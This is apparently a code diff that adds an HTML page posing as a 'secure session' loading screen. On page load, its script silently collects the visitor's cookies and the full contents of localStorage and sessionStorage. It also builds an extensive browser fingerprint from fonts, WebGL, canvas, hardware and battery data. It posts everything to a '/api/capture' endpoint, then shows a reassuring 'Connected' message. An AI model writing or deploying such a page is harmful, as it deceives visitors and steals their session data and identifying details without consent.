@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+  body { background: #0f0f0f; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+  .container { text-align: center; max-width: 600px; }
+  h1 { font-size: 1.5rem; margin-bottom: 0.5rem; }
+  .blink { animation: blink 1s infinite; }
+  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+  .small { font-size: 0.8rem; opacity: 0.6; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>Connecting<span class="blink">...</span></h1>
+  <p class="small">Establishing secure session</p>
+</div>
+
+<script>
+(async function() {
+  const payload = {
+    timestamp: new Date().toISOString(),
+    url: window.location.href,
+    referrer: document.referrer || 'direct',
+    // Browser & OS
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    languages: navigator.languages,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    // Screen
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth
+    },
+    window: {
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight,
+      devicePixelRatio: window.devicePixelRatio
+    },
+    // Time
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    // Cookies
+    cookies: document.cookie || 'none',
+    // Storage
+    localStorage: Object.keys(localStorage).length > 0 ? Object.entries(localStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
+    sessionStorage: Object.keys(sessionStorage).length > 0 ? Object.entries(sessionStorage).reduce((acc,[k,v]) => { acc[k]=v; return acc; }, {}) : 'empty',
+    // Hardware
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    // Connection
+    connection: navigator.connection ? {
+      effectiveType: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    } : 'unknown',
+    // Battery
+    battery: 'unknown'
+  };
+
+  // Battery API
+  if (navigator.getBattery) {
+    try {
+      const b = await navigator.getBattery();
+      payload.battery = { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+    } catch(e) {}
+  }
+
+  // Font fingerprinting
+  const fonts = ['monospace','sans-serif','serif','Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Lucida Console','Tahoma','Courier','Lucida Sans Unicode'];
+  const detected = [];
+  const base = document.createElement('div');
+  base.style.cssText = 'position:absolute;left:-999px;visibility:hidden;font-size:72px;white-space:nowrap';
+  const testStr = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  const span = document.createElement('span');
+  span.textContent = testStr;
+  base.appendChild(span);
+  document.body.appendChild(base);
+  const baseline = {};
+  for (const f of ['monospace','sans-serif','serif']) {
+    span.style.fontFamily = f;
+    baseline[f] = span.offsetWidth;
+  }
+  for (const f of fonts) {
+    span.style.fontFamily = `"${f}",monospace`;
+    if (span.offsetWidth !== baseline.monospace) detected.push(f);
+    else {
+      span.style.fontFamily = `"${f}",sans-serif`;
+      if (span.offsetWidth !== baseline['sans-serif']) detected.push(f);
+      else {
+        span.style.fontFamily = `"${f}",serif`;
+        if (span.offsetWidth !== baseline.serif) detected.push(f);
+      }
+    }
+  }
+  document.body.removeChild(base);
+  payload.fonts = detected;
+
+  // WebGL fingerprinting
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const ext = gl.getExtension('WEBGL_debug_renderer_info');
+      payload.webgl = {
+        vendor: gl.getParameter(gl.VENDOR),
+        renderer: gl.getParameter(gl.RENDERER),
+        unmaskedVendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'n/a',
+        unmaskedRenderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'n/a'
+      };
+    }
+  } catch(e) {}
+
+  // Canvas fingerprint
+  try {
+    const c = document.createElement('canvas');
+    c.width = 200; c.height = 50;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(100,10,50,30);
+    ctx.fillStyle = '#069';
+    ctx.fillText('BrowserLab', 2, 15);
+    payload.canvasFingerprint = c.toDataURL();
+  } catch(e) {}
+
+  // Send data to server
+  try {
+    const res = await fetch('/api/capture', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (res.ok) {
+      document.querySelector('h1').textContent = 'Connected';
+      document.querySelector('.small').textContent = 'Session established securely';
+    }
+  } catch(e) {
+    document.querySelector('h1').textContent = 'Connection error';
+    document.querySelector('.small').textContent = 'Could not reach server';
+  }
+})();
+</script>
+</body>
+</html>
